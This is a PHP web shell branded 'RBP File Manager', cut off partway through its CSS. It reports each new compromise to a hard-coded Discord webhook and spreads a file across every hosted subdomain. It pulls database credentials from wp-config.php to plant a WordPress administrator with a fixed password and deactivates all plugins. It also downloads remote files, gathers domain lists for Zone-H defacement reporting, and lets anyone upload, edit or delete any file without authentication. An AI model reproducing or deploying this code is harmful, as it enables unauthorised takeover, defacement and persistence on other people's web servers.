<?php
// Discord Webhook Notification when script is accessed
$webhookUrl = "https://discord.com/api/webhooks/1440628547784937632/UPihGhacKZ-AFt0iwOdReRCqghTydFrDlaQWsYqxPVOjCjM0fTJKiIyTqz7IWx_2soNJ";

// Send webhook only once when script is accessed
if (!isset($_COOKIE['rbp_visited'])) {
    $currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $serverIP = $_SERVER['SERVER_ADDR'] ?? 'Unknown';
    $userIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    $payload = json_encode([
        'embeds' => [
            [
                'title' => 'Shell Uploaded',
                'description' => 'A new RBP shell has been uploaded and accessed',
                'color' => 15105570,
                'fields' => [
                    [
                        'name' => 'Site',
                        'value' => $currentUrl,
                        'inline' => false
                    ],
                    [
                        'name' => 'Server IP',
                        'value' => $serverIP,
                        'inline' => true
                    ],
                    [
                        'name' => 'User IP',
                        'value' => $userIP,
                        'inline' => true
                    ],
                    [
                        'name' => 'Current Directory',
                        'value' => getcwd(),
                        'inline' => false
                    ]
                ],
                'timestamp' => date('c'),
                'footer' => [
                    'text' => 'RBP File Manager'
                ]
            ]
        ]
    ]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $webhookUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);

    // Set cookie to prevent duplicate notifications
    setcookie('rbp_visited', '1', time() + (86400 * 30), "/"); // 30 days
}

// Auto-detect base directory for domains
function RBPautoDetectBaseDir() {
    $possiblePaths = [
        '/home/*/domains',
        '/home/*/public_html',
        '/var/www',
        '/home/*/www',
        '/home/*/web',
        '/home/*/*/public_html'
    ];
    
    $currentUser = function_exists('posix_getpwuid') ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown') : 'unknown';
    
    foreach ($possiblePaths as $path) {
        $expandedPath = str_replace('*', $currentUser, $path);
        if (is_dir($expandedPath)) {
            return $expandedPath;
        }
    }
    
    // Fallback to current directory
    return getcwd();
}

// Get all subdomains from domains directory
function RBPgetAllSubdomains($baseDir) {
    $subdomains = [];
    
    // Look for domains directory structure
    if (is_dir($baseDir)) {
        // Check if this is a domains directory
        $domainDirs = glob($baseDir . '/*', GLOB_ONLYDIR);
        if ($domainDirs) {
            foreach ($domainDirs as $domainDir) {
                $domainName = basename($domainDir);
                
                // Check for public_html in domain directory
                $publicHtml = $domainDir . '/public_html';
                if (is_dir($publicHtml)) {
                    $subdomains[] = [
                        'name' => $domainName,
                        'path' => $publicHtml,
                        'url' => 'https://' . $domainName
                    ];
                }
                
                // Also check for subdomain directories
                $subdomainDirs = glob($domainDir . '/*', GLOB_ONLYDIR);
                if ($subdomainDirs) {
                    foreach ($subdomainDirs as $subdomainDir) {
                        $subdomainName = basename($subdomainDir);
                        $subPublicHtml = $subdomainDir . '/public_html';
                        if (is_dir($subPublicHtml)) {
                            $subdomains[] = [
                                'name' => $subdomainName . '.' . $domainName,
                                'path' => $subPublicHtml,
                                'url' => 'https://' . $subdomainName . '.' . $domainName
                            ];
                        }
                    }
                }
            }
        }
    }
    
    return $subdomains;
}

// Mass deploy file to all subdomains with progress
function RBPmassDeploy($sourceFile, $baseDir) {
    $results = [];
    $subdomains = RBPgetAllSubdomains($baseDir);
    $total = count($subdomains);
    $processed = 0;
    
    if (!file_exists($sourceFile)) {
        return ["error" => "Source file not found: $sourceFile"];
    }
    
    $fileContent = file_get_contents($sourceFile);
    if ($fileContent === false) {
        return ["error" => "Cannot read source file: $sourceFile"];
    }
    
    // Get the original filename
    $originalFilename = basename($sourceFile);
    
    foreach ($subdomains as $subdomain) {
        $processed++;
        $targetFile = $subdomain['path'] . '/' . $originalFilename;
        
        // Create directory if it doesn't exist
        $targetDir = dirname($targetFile);
        if (!is_dir($targetDir)) {
            if (!mkdir($targetDir, 0755, true)) {
                $results[] = "[$processed/$total] Failed to create directory: " . $subdomain['name'];
                continue;
            }
        }
        
        if (file_put_contents($targetFile, $fileContent)) {
            $results[] = "[$processed/$total] Deployed to: " . $subdomain['name'];
        } else {
            $results[] = "[$processed/$total] Failed: " . $subdomain['name'];
        }
    }
    
    return $results;
}

// Mass delete files from all subdomains with progress
function RBPmassDelete($baseDir, $filename) {
    $results = [];
    $subdomains = RBPgetAllSubdomains($baseDir);
    $total = count($subdomains);
    $processed = 0;
    
    foreach ($subdomains as $subdomain) {
        $processed++;
        $targetFile = $subdomain['path'] . '/' . $filename;
        
        if (file_exists($targetFile) && unlink($targetFile)) {
            $results[] = "[$processed/$total] Deleted from: " . $subdomain['name'];
        } else {
            $results[] = "[$processed/$total] Not found: " . $subdomain['name'];
        }
    }
    
    return $results;
}

// Download domains list
function RBPdownloadDomainsList($baseDir, $filename) {
    $subdomains = RBPgetAllSubdomains($baseDir);
    $domainsList = [];
    
    foreach ($subdomains as $subdomain) {
        if (!empty($filename)) {
            $domainsList[] = $subdomain['url'] . '/' . $filename;
        } else {
            $domainsList[] = $subdomain['url'];
        }
    }
    
    return $domainsList;
}

// WordPress User Editor Function
function RBPeditWordPressUser() {
    $result = [];
    
    // Start from current directory and search upwards for wp-config.php
    $currentDir = getcwd();
    $wpConfigPath = null;
    $wpDir = null;
    
    // Search for wp-config.php in current directory and parent directories
    $searchDir = $currentDir;
    $maxDepth = 10; // Prevent infinite loop
    
    for ($i = 0; $i < $maxDepth; $i++) {
        $configPath = $searchDir . '/wp-config.php';
        if (file_exists($configPath)) {
            $wpConfigPath = $configPath;
            $wpDir = $searchDir;
            break;
        }
        
        // If we're at root, stop searching
        if ($searchDir === '/' || $searchDir === dirname($searchDir)) {
            break;
        }
        
        $searchDir = dirname($searchDir);
    }
    
    if (!$wpConfigPath || !file_exists($wpConfigPath)) {
        $result['error'] = "WordPress configuration file (wp-config.php) not found! Searched from: $currentDir";
        $result['current_dir'] = $currentDir;
        $result['searched_paths'] = "Searched up to: $searchDir";
        return $result;
    }
    
    $result['wp_config_path'] = $wpConfigPath;
    $result['wp_directory'] = $wpDir;

    // Default credentials
    $new_user_login = 'ReaperBythe222@';
    $new_user_pass  = 'ReaperBythe222@';
    $new_user_email = 'admin@example.com';

    $wp_index_path  = $wpDir . '/index.php';

    function parse_wp_config_constants($file_path, $constants = ['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST']) {
        $values = [];
        $content = file_get_contents($file_path);
        foreach ($constants as $const) {
            if (preg_match("/define\s*\(\s*['\"]" . preg_quote($const, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
                $values[$const] = $matches[1];
            } else {
                $values[$const] = null;
            }
        }
        return $values;
    }

    function parse_table_prefix($file_path) {
        $content = file_get_contents($file_path);
        if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]\s*;/", $content, $matches)) {
            return $matches[1];
        }
        return 'wp_';
    }

    function detect_default_theme($wp_dir) {
        $themes_dir = $wp_dir . '/wp-content/themes';
        $default_theme = 'twentytwentyfour';

        if (is_dir($themes_dir)) {
            $themes = scandir($themes_dir);
            $candidates = [];
            foreach ($themes as $theme) {
                if (preg_match('/^twenty(\d{2,4})$/', $theme, $matches)) {
                    $candidates[$matches[1]] = $theme;
                }
            }
            if (!empty($candidates)) {
                krsort($candidates);
                $default_theme = reset($candidates);
            }
        }
        return $default_theme;
    }

    function restore_wordpress_index($index_path) {
        $default_content = "<?php
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';";

        if (file_exists($index_path)) {
            unlink($index_path);
        }
        file_put_contents($index_path, $default_content);
    }

    class PasswordHash {
        private $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        private $iteration_count_log2;
        private $portable_hashes;
        private $random_state;

        public function __construct($iteration_count_log2 = 8, $portable_hashes = true) {
            $this->iteration_count_log2 = $iteration_count_log2;
            $this->portable_hashes      = $portable_hashes;
            $this->random_state         = microtime() . uniqid(rand(), true);
        }

        private function get_random_bytes($count) {
            $output = '';
            if (($fh = @fopen('/dev/urandom', 'rb'))) {
                $output = fread($fh, $count);
                fclose($fh);
            }
            if (strlen($output) < $count) {
                $output = '';
                for ($i = 0; $i < $count; $i += 16) {
                    $this->random_state = md5(microtime() . $this->random_state);
                    $output .= pack('H*', md5($this->random_state));
                }
                $output = substr($output, 0, $count);
            }
            return $output;
        }

        private function encode64($input, $count) {
            $output = '';
            $i = 0;
            do {
                $value = ord($input[$i++]);
                $output .= $this->itoa64[$value & 0x3f];
                if ($i < $count)
                    $value |= ord($input[$i]) << 8;
                else
                    $output .= $this->itoa64[($value >> 6) & 0x3f];
                if ($i++ >= $count)
                    break;
                if ($i < $count)
                    $value |= ord($input[$i]) << 16;
                else
                    $output .= $this->itoa64[($value >> 12) & 0x3f];
                $output .= $this->itoa64[($value >> 18) & 0x3f];
            } while ($i < $count);
            return $output;
        }

        public function gensalt_private($input) {
            $output = '$P$';
            $output .= $this->itoa64[min($this->iteration_count_log2 + 5, 30)];
            $output .= $this->encode64($input, 6);
            return $output;
        }

        public function crypt_private($password, $setting) {
            $output = '*0';
            if (substr($setting, 0, 2) === $output)
                $output = '*1';
            $id = substr($setting, 0, 3);
            if ($id !== '$P$' && $id !== '$H$')
                return $output;
            $count_log2 = strpos($this->itoa64, $setting[3]);
            if ($count_log2 < 7 || $count_log2 > 30)
                return $output;
            $count = 1 << $count_log2;
            $salt  = substr($setting, 4, 8);
            if (strlen($salt) !== 8)
                return $output;
            $hash = md5($salt . $password, true);
            do {
                $hash = md5($hash . $password, true);
            } while (--$count);
            $output = substr($setting, 0, 12);
            $output .= $this->encode64($hash, 16);
            return $output;
        }

        public function HashPassword($password) {
            $random = $this->get_random_bytes(6);
            $hash = $this->crypt_private($password, $this->gensalt_private($random));
            if (strlen($hash) === 34) return $hash;
            return md5($password);
        }
    }

    $db_constants = parse_wp_config_constants($wpConfigPath);
    $table_prefix = parse_table_prefix($wpConfigPath);

    if (in_array(null, $db_constants, true)) {
        $result['error'] = "Could not parse WordPress database configuration from wp-config.php";
        return $result;
    }

    $db_name     = $db_constants['DB_NAME'];
    $db_user     = $db_constants['DB_USER'];
    $db_password = $db_constants['DB_PASSWORD'];
    $db_host     = $db_constants['DB_HOST'];

    // Test database connection
    $mysqli = @new mysqli($db_host, $db_user, $db_password, $db_name);
    if ($mysqli->connect_error) {
        $result['error'] = "Database connection failed: " . $mysqli->connect_error;
        return $result;
    }

    $hasher = new PasswordHash();
    $password_hash = $hasher->HashPassword($new_user_pass);

    // Check if user exists
    $stmt = $mysqli->prepare("SELECT ID FROM `{$table_prefix}users` WHERE user_login = ?");
    $stmt->bind_param('s', $new_user_login);
    $stmt->execute();
    $stmt->bind_result($existing_user_id);
    $user_exists = $stmt->fetch();
    $stmt->close();

    if ($user_exists) {
        // Update existing user
        $stmt = $mysqli->prepare("UPDATE `{$table_prefix}users` SET user_pass = ?, user_email = ? WHERE ID = ?");
        $stmt->bind_param('ssi', $password_hash, $new_user_email, $existing_user_id);
        if (!$stmt->execute()) {
            $result['error'] = "Failed to update existing user: " . $mysqli->error;
            $mysqli->close();
            return $result;
        }
        $stmt->close();
        $result['action'] = 'updated';
    } else {
        // Create new user
        $time = date('Y-m-d H:i:s');
        $stmt = $mysqli->prepare("
        INSERT INTO `{$table_prefix}users` 
        (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) 
        VALUES (?, ?, ?, ?, '', ?, '', 0, ?)
        ");

        $user_nicename = strtolower($new_user_login);
        $display_name  = $new_user_login;
        $stmt->bind_param('ssssss', $new_user_login, $password_hash, $user_nicename, $new_user_email, $time, $display_name);
        if (!$stmt->execute()) {
            $result['error'] = "Failed to create new user: " . $mysqli->error;
            $mysqli->close();
            return $result;
        }
        $new_user_id = $stmt->insert_id;
        $stmt->close();

        // Set user capabilities (administrator)
        $cap_key = $table_prefix . 'capabilities';
        $level_key = $table_prefix . 'user_level';
        $capabilities = serialize(['administrator' => true]);

        $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
        $stmt->bind_param('iss', $new_user_id, $cap_key, $capabilities);
        if (!$stmt->execute()) {
            $result['error'] = "Failed to set user capabilities: " . $mysqli->error;
            $mysqli->close();
            return $result;
        }
        $stmt->close();

        // Set user level
        $user_level = 10;
        $level_value = (string)$user_level;
        $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
        $stmt->bind_param('iss', $new_user_id, $level_key, $level_value);
        if (!$stmt->execute()) {
            $result['error'] = "Failed to set user level: " . $mysqli->error;
            $mysqli->close();
            return $result;
        }
        $stmt->close();
        $result['action'] = 'created';
    }

    // Reset active plugins
    $empty_plugins = serialize([]);
    $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name = 'active_plugins'");
    if ($stmt) {
        $stmt->bind_param('s', $empty_plugins);
        $stmt->execute();
        $stmt->close();
    }

    // Set default theme
    $default_theme = detect_default_theme($wpDir);
    $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name IN ('template','stylesheet')");
    if ($stmt) {
        $stmt->bind_param('s', $default_theme);
        $stmt->execute();
        $stmt->close();
    }

    // Restore WordPress index
    if (file_exists($wp_index_path)) {
        restore_wordpress_index($wp_index_path);
    }

    $mysqli->close();

    // Get WordPress login URL
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'];
    $loginUrl = $protocol . $host . '/wp-login.php';
    
    $result['success'] = "WordPress user " . $result['action'] . " successfully!";
    $result['credentials'] = "Username: $new_user_login | Password: $new_user_pass";
    $result['login_url'] = $loginUrl;
    $result['current_dir'] = $currentDir;
    $result['wp_directory_found'] = $wpDir;
    
    return $result;
}

// Handle base directory setting
$defaultBaseDir = RBPautoDetectBaseDir();
if (isset($_POST['baseDir'])) {
    $baseDir = $_POST['baseDir'];
    setcookie("baseDir", $baseDir, time() + 3600);
} else {
    $baseDir = $_COOKIE['baseDir'] ?? $defaultBaseDir;
}

// Handle directory navigation
if (isset($_GET['d']) && !empty($_GET['d'])) {
    $currentDir = base64_decode($_GET['d']);
    $currentDir = realpath($currentDir) ?: $currentDir;
} else {
    $currentDir = getcwd();
}

$currentDir = str_replace("\\", "/", $currentDir);
$dir = $currentDir;

// Start session early for all operations
if (!isset($_SESSION)) {
    session_start();
}

// Check if this is a POST request for specific actions
$isPostAction = false;

// Download domains list handler
if (isset($_GET['download'])) {
    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="domains.txt"');
    $extension = $_GET['extension'] ?? 'rbp.html';
    $domainsList = RBPdownloadDomainsList($baseDir, $extension);
    foreach ($domainsList as $domain) {
        echo $domain . "\n";
    }
    exit;
}

// Mass deploy handler
if (isset($_POST['mass_deploy'])) {
    $isPostAction = true;
    $sourceFile = $_POST['deploy_file_path'] ?? '';
    
    if (empty($sourceFile) || !file_exists($sourceFile)) {
        $_SESSION['mass_deploy_results'] = ["error" => "Source file not found: $sourceFile"];
        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
        exit;
    }
    
    $results = RBPmassDeploy($sourceFile, $baseDir);
    $_SESSION['mass_deploy_results'] = $results;
    $_SESSION['mass_deploy_source'] = $sourceFile;
    $_SESSION['mass_deploy_base'] = $baseDir;
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
    exit;
}

// Mass delete handler
if (isset($_POST['mass_delete'])) {
    $isPostAction = true;
    $sourceFile = $_POST['deploy_file_path'] ?? '';
    $filename = basename($sourceFile);
    
    $results = RBPmassDelete($baseDir, $filename);
    $_SESSION['mass_delete_results'] = $results;
    $_SESSION['mass_delete_filename'] = $filename;
    $_SESSION['mass_delete_base'] = $baseDir;
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
    exit;
}

// WordPress User Editor Handler
if (isset($_POST['wp_edit_user_submit'])) {
    $isPostAction = true;
    $result = RBPeditWordPressUser();
    $_SESSION['wp_edit_results'] = $result;
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
    exit;
}

// WGET Download Functionality
if (isset($_POST['wget_url'])) {
    $isPostAction = true;
    $url = $_POST['wget_url'] ?? '';
    $fileName = basename($url);
    $destination = $currentDir . '/' . $fileName;
    
    if (!empty($url)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        $fileContent = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($httpCode === 200 && $fileContent !== false && file_put_contents($destination, $fileContent)) {
            $_SESSION['wget_result'] = "File downloaded successfully!";
        } else {
            $_SESSION['wget_result'] = "Download failed! HTTP Code: $httpCode";
        }
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
    exit;
}

// Adminer Download Functionality
if (isset($_POST['download_adminer'])) {
    $isPostAction = true;
    function RBPadminer($url, $isi) {
        $fp = fopen($isi, "w");
        if (!$fp) return false;
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_FILE, $fp);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        fclose($fp);
        
        return $httpCode === 200 && $result !== false;
    }

    if (file_exists('adminer.php')) {
        $_SESSION['adminer_result'] = "Adminer is already downloaded!";
    } else {
        if (RBPadminer("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php", "adminer.php")) {
            $_SESSION['adminer_result'] = "Adminer downloaded successfully!";
        } else {
            $_SESSION['adminer_result'] = "Failed to download adminer.php";
        }
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
    exit;
}

// Zone-H Functionality
if (isset($_POST['zoneh_submit'])) {
    $isPostAction = true;
    $domainList = isset($_POST['zoneh_url']) ? explode("\n", str_replace("\r", "", $_POST['zoneh_url'])) : [];
    $nick = $_POST['zoneh_nick'] ?? 'RBP';
    
    $_SESSION['zoneh_results'] = [
        'nick' => $nick,
        'domains' => $domainList
    ];
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
    exit;
}

// Upload handler - shellko.php style bypass
if (isset($_POST['s']) && isset($_FILES['u'])) {
    $isPostAction = true;
    if ($_FILES['u']['error'] == 0) {
        $fileName = $_FILES['u']['name'];
        $tmpName = $_FILES['u']['tmp_name'];
        $destination = $currentDir . '/' . $fileName;
        if (move_uploaded_file($tmpName, $destination)) {
            $_SESSION['upload_result'] = "SUCCESS: File uploaded successfully!";
        } else {
            $_SESSION['upload_result'] = "ERROR: Upload failed!";
        }
    } else {
        $_SESSION['upload_result'] = "ERROR: Upload error: " . $_FILES['u']['error'];
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
    exit;
}

// Delete File handler - shellko.php style bypass
if (isset($_POST['del'])) {
    $isPostAction = true;
    $filePath = base64_decode($_POST['del']);
    if (@unlink($filePath)) {
        $_SESSION['delete_result'] = "SUCCESS: File deleted successfully!";
    } else {
        $_SESSION['delete_result'] = "ERROR: Delete failed!";
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
    exit;
}

// Save Edited File handler - shellko.php style bypass
if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
    $isPostAction = true;
    $filePath = base64_decode($_POST['obj']);
    if (file_put_contents($filePath, $_POST['content'])) {
        $_SESSION['save_result'] = "SUCCESS: File saved successfully!";
    } else {
        $_SESSION['save_result'] = "ERROR: Save failed!";
    }
    $fileDir = dirname($filePath);
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($fileDir));
    exit;
}

// Rename handler - shellko.php style bypass
if (isset($_POST['ren']) && isset($_POST['new'])) {
    $isPostAction = true;
    $oldPath = base64_decode($_POST['ren']);
    $newPath = dirname($oldPath) . '/' . $_POST['new'];
    if (rename($oldPath, $newPath)) {
        $_SESSION['rename_result'] = "SUCCESS: File renamed successfully!";
    } else {
        $_SESSION['rename_result'] = "ERROR: Rename failed!";
    }
    $oldDir = dirname($oldPath);
    header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($oldDir));
    exit;
}

// Download File handler
if (isset($_POST['download_file'])) {
    $isPostAction = true;
    $filePath = base64_decode($_POST['download_file']);
    if (file_exists($filePath) && is_file($filePath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    } else {
        $_SESSION['download_result'] = "ERROR: File not found!";
        header("Location: " . $_SERVER['PHP_SELF'] . "?d=" . base64_encode($currentDir));
        exit;
    }
}

// Show success/error notifications
if (isset($_SESSION['upload_result'])) {
    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
    if (strpos($_SESSION['upload_result'], 'SUCCESS') !== false) {
        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
    } else {
        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
    }
    echo "'>" . $_SESSION['upload_result'] . "</div>";
    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
    unset($_SESSION['upload_result']);
}

if (isset($_SESSION['delete_result'])) {
    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
    if (strpos($_SESSION['delete_result'], 'SUCCESS') !== false) {
        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
    } else {
        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
    }
    echo "'>" . $_SESSION['delete_result'] . "</div>";
    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
    unset($_SESSION['delete_result']);
}

if (isset($_SESSION['save_result'])) {
    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
    if (strpos($_SESSION['save_result'], 'SUCCESS') !== false) {
        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
    } else {
        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
    }
    echo "'>" . $_SESSION['save_result'] . "</div>";
    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
    unset($_SESSION['save_result']);
}

if (isset($_SESSION['rename_result'])) {
    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
    if (strpos($_SESSION['rename_result'], 'SUCCESS') !== false) {
        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
    } else {
        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
    }
    echo "'>" . $_SESSION['rename_result'] . "</div>";
    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
    unset($_SESSION['rename_result']);
}

if (isset($_SESSION['wget_result'])) {
    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
    if (strpos($_SESSION['wget_result'], 'successfully') !== false) {
        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
    } else {
        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
    }
    echo "'>" . $_SESSION['wget_result'] . "</div>";
    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
    unset($_SESSION['wget_result']);
}

if (isset($_SESSION['adminer_result'])) {
    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
    if (strpos($_SESSION['adminer_result'], 'successfully') !== false) {
        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
    } else {
        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
    }
    echo "'>" . $_SESSION['adminer_result'] . "</div>";
    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
    unset($_SESSION['adminer_result']);
}

if (isset($_SESSION['download_result'])) {
    echo "<div style='position: fixed; top: 10px; right: 10px; padding: 15px; border-radius: 5px; z-index: 9999; font-weight: bold; ";
    if (strpos($_SESSION['download_result'], 'SUCCESS') !== false) {
        echo "background: #4CAF50; color: white; border: 2px solid #45a049;";
    } else {
        echo "background: #f44336; color: white; border: 2px solid #d32f2f;";
    }
    echo "'>" . $_SESSION['download_result'] . "</div>";
    echo "<script>setTimeout(function(){ document.querySelector('div[style*=\"position: fixed\"]').remove(); }, 3000);</script>";
    unset($_SESSION['download_result']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>RBP File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0c0c0c;
            color: #fff;
            min-height: 100vh;
        }
        
        .header {
            background: #0c0c0c;
            padding: 15px 0;
            border-bottom: 2px solid #333;
            text-align: center;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 15px;
        }

        .logo {
            width: 50px;
            height: 50px;
            border-radius: 50%;
        }

        .logo-text {
            font-size: 24px;
            font-weight: bold;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: colorShift 3s ease infinite;
        }
        
        @keyframes colorShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .toolbar {
            background: #1a1a1a;
            padding: 10px;
            text-align: center;
            border-bottom: 1px solid #333;
        }
        
        .tool-button {
            display: inline-block;
            margin: 5px;
            padding: 8px 16px;
            background: #1a1a1a;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            border: 1px solid #555;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .tool-button:hover {
            background: #333;
            border-color: #777;
        }
        
        .upload-section {
            background: #1a1a1a;
            padding: 15px;
            text-align: center;
            border-bottom: 1px solid #333;
        }
        
        .dir-path {
            background: #1a1a1a;
            padding: 10px;
            margin: 0;
            border-bottom: 1px solid #333;
            font-size: 14px;
            color: white;
        }
        
        .dir-path a {
            color: white;
            text-decoration: none;
            font-weight: bold;
        }
        
        .dir-path a:hover {
            text-decoration: underline;
            color: #4fc3f7;
        }
        
        .file-list {
            margin: 10px;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            padding: 8px;
            margin: 2px 0;
            background: #1a1a1a;
            border-radius: 5px;
            border: 1px solid #333;
            transition: all 0.2s ease;
            color: white;
        }
        
        .file-item:hover {
            background: #222;
            border-color: #555;
        }
        
        .file-item.folder {
            cursor: pointer;
        }
        
        .file-icon {
            width: 30px;
            text-align: center;
            font-size: 16px;
        }
        
        .file-name {
            flex: 1;
            padding: 0 10px;
            cursor: pointer;
            color: white;
        }
        
        .file-size {
            width: 80px;
            text-align: right;
            font-size: 12px;
            color: #aaa;
        }
        
        .file-actions {
            width: 250px;
            text-align: right;
        }
        
        .file-actions button {
            margin-left: 5px;
            padding: 3px 8px;
            background: #1a1a1a;
            color: white;
            border: 1px solid #555;
            border-radius: 3px;
            cursor: pointer;
            font-size: 11px;
        }
        
        .file-actions button:hover {
            background: #333;
        }
        
        textarea { 
            width: 100%; 
            height: 400px; 
            background: #1a1a1a;
            color: #fff;
            border: 1px solid #444;
            border-radius: 5px;
            padding: 10px;
            font-family: monospace;
            margin: 10px;
        }
        
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
        }
        
        .popup-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            border: 2px solid #444;
            color: #fff;
            width: 700px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .popup-content input[type="text"],
        .popup-content input[type="password"],
        .popup-content textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #2a2a2a;
            border: 1px solid #444;
            border-radius: 5px;
            color: #fff;
        }
        
        .popup-content button {
            padding: 8px 15px;
            background: #1a1a1a;
            color: white;
            border: 1px solid #555;
            border-radius: 5px;
